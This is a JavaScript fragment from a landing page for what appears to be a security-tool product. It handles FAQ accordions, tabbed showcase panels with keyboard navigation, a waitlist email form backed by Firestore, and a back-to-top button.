  // Keyboard accessibility: make pricing cards focusable
  view.querySelectorAll(".bento-card, .nx-card, .gh-card").forEach(el => {
    if (!el.getAttribute("tabindex") && !el.closest("a")) {
      el.setAttribute("tabindex", "0");
    }
  });

  // FAQ accordion
  view.querySelectorAll(".faq-q").forEach(btn => {
    btn.addEventListener("click", () => {
      const item = btn.closest(".faq-item");
      const panel = item.querySelector(".faq-a");
      const toggle = btn.querySelector(".faq-toggle");
      const isOpen = item.classList.contains("open");

      if (isOpen) {
        // Collapse: animate from current height to 0
        panel.style.maxHeight = panel.scrollHeight + "px";
        requestAnimationFrame(() => {
          panel.style.maxHeight = "0";
        });
        item.classList.remove("open");
        btn.setAttribute("aria-expanded", "false");
        toggle.textContent = "+";
        panel.addEventListener("transitionend", function handler() {
          panel.hidden = true;
          panel.removeEventListener("transitionend", handler);
        });
      } else {
        // Expand: reveal then animate from 0 to scrollHeight
        panel.hidden = false;
        panel.style.maxHeight = "0";
        requestAnimationFrame(() => {
          panel.style.maxHeight = panel.scrollHeight + "px";
        });
        item.classList.add("open");
        btn.setAttribute("aria-expanded", "true");
        toggle.textContent = "−";
        panel.addEventListener("transitionend", function handler() {
          panel.style.maxHeight = "none";
          panel.removeEventListener("transitionend", handler);
        });
      }
    });
  });

  // Tool showcase: category filter tabs
  const tsTabs = view.querySelectorAll(".ts-tab");
  const tsCards = view.querySelectorAll(".ts-card");
  tsTabs.forEach(tab => {
    tab.addEventListener("click", () => {
      tsTabs.forEach(t => { t.classList.remove("on"); t.setAttribute("aria-selected", "false"); });
      tab.classList.add("on");
      tab.setAttribute("aria-selected", "true");
      const cat = tab.dataset.cat;
      tsCards.forEach(card => {
        if (cat === "all" || card.dataset.cat === cat) {
          card.style.display = "";
          card.classList.add("revealed");
        } else {
          card.style.display = "none";
        }
      });
    });
  });

  // Tool showcase: "View all 192+ tools" links to the tools section in the app
  const tsViewAll = $("ts-view-all");
  if (tsViewAll) {
    tsViewAll.addEventListener("click", (e) => {
      e.preventDefault();
      if (actions.onGetStarted) actions.onGetStarted();
    });
  }

  // Showcase tabs: "See it in action" tabbed terminal demo
  const showcaseTabs = view.querySelectorAll(".showcase-tab");
  const showcasePanels = view.querySelectorAll(".showcase-panel");
  const showcaseDots = view.querySelectorAll(".showcase-dot");
  const showcaseTitles = { recon: "darknode", analysis: "nexus", exploit: "nexus", report: "darknode" };
  const showcaseTitleEl = view.querySelector("#showcase-tw-title");

  function switchShowcaseTab(tabName) {
    showcaseTabs.forEach(t => {
      const active = t.dataset.tab === tabName;
      t.classList.toggle("active", active);
      t.setAttribute("aria-selected", active ? "true" : "false");
    });
    showcasePanels.forEach(p => {
      const id = p.id.replace("stab-", "");
      if (id === tabName) {
        p.hidden = false;
        p.classList.add("showcase-panel-in");
      } else {
        p.hidden = true;
        p.classList.remove("showcase-panel-in");
      }
    });
    showcaseDots.forEach(d => d.classList.toggle("active", d.dataset.tab === tabName));
    if (showcaseTitleEl) showcaseTitleEl.textContent = showcaseTitles[tabName] || "darknode";
  }

  showcaseTabs.forEach(tab => {
    tab.addEventListener("click", () => switchShowcaseTab(tab.dataset.tab));
  });
  showcaseDots.forEach(dot => {
    dot.addEventListener("click", () => switchShowcaseTab(dot.dataset.tab));
  });

  // Keyboard navigation for showcase tabs (left/right arrows)
  showcaseTabs.forEach(tab => {
    tab.addEventListener("keydown", (e) => {
      const tabList = Array.from(showcaseTabs);
      const idx = tabList.indexOf(tab);
      let next = -1;
      if (e.key === "ArrowRight") next = (idx + 1) % tabList.length;
      else if (e.key === "ArrowLeft") next = (idx - 1 + tabList.length) % tabList.length;
      if (next >= 0) {
        e.preventDefault();
        tabList[next].focus();
        switchShowcaseTab(tabList[next].dataset.tab);
      }
    });
  });

  // Security Knowledge RAG tabs
  const ragTabs = view.querySelectorAll(".rag-tab");
  const ragPanels = view.querySelectorAll(".rag-panel");
  ragTabs.forEach(tab => {
    tab.addEventListener("click", () => {
      const target = tab.dataset.rag;
      ragTabs.forEach(t => {
        const active = t.dataset.rag === target;
        t.classList.toggle("active", active);
        t.setAttribute("aria-selected", active ? "true" : "false");
      });
      ragPanels.forEach(p => {
        const active = p.dataset.ragPanel === target;
        p.classList.toggle("active", active);
        if (active) {
          // Re-trigger reveal on newly visible cards
          p.querySelectorAll(".rag-card").forEach(c => c.classList.add("revealed"));
        }
      });
    });
    // Keyboard navigation for RAG tabs (left/right arrows)
    tab.addEventListener("keydown", (e) => {
      const tabList = Array.from(ragTabs);
      const idx = tabList.indexOf(tab);
      let next = -1;
      if (e.key === "ArrowRight") next = (idx + 1) % tabList.length;
      else if (e.key === "ArrowLeft") next = (idx - 1 + tabList.length) % tabList.length;
      if (next >= 0) {
        e.preventDefault();
        tabList[next].focus();
        tabList[next].click();
      }
    });
  });

  // Newsletter signup — store email in Firestore "waitlist" collection
  const notifyForm = $("cta-notify-form");
  const notifyEmail = $("cta-email");
  const notifyBtn = $("cta-notify-btn");
  const notifyMsg = $("cta-reassure");
  if (notifyForm) {
    notifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = (notifyEmail.value || "").trim().toLowerCase();
      if (!email) return;
      notifyBtn.disabled = true;
      notifyBtn.textContent = "Sending...";
      try {
        await addDoc(collection(db, "waitlist"), {
          email,
          source: "landing-cta",
          createdAt: serverTimestamp()
        });
        notifyMsg.textContent = "You are on the list. We will email you when Pro launches.";
        notifyMsg.classList.add("cta-reassure-ok");
        notifyEmail.value = "";
        notifyBtn.textContent = "Done";
      } catch (err) {
        notifyMsg.textContent = "Something went wrong. Please try again.";
        notifyMsg.classList.add("cta-reassure-err");
        notifyBtn.disabled = false;
        notifyBtn.textContent = "Notify me";
      }
    });
  }

  // Back to top button — show after scrolling down 600px
  const bttBtn = $("btt");
  if (bttBtn) {
    let bttVisible = false;
    const toggleBtt = () => {
      const scrolled = window.scrollY > 600;
      if (scrolled !== bttVisible) {
        bttVisible = scrolled;
        bttBtn.classList.toggle("btt-show", scrolled);
      }
    };
    window.addEventListener("scroll", toggleBtt, { passive: true });
    toggleBtt();
    bttBtn.addEventListener("click", () => {
      window.scrollTo({ top: 0, behavior: "smooth" });
    });
  }
}
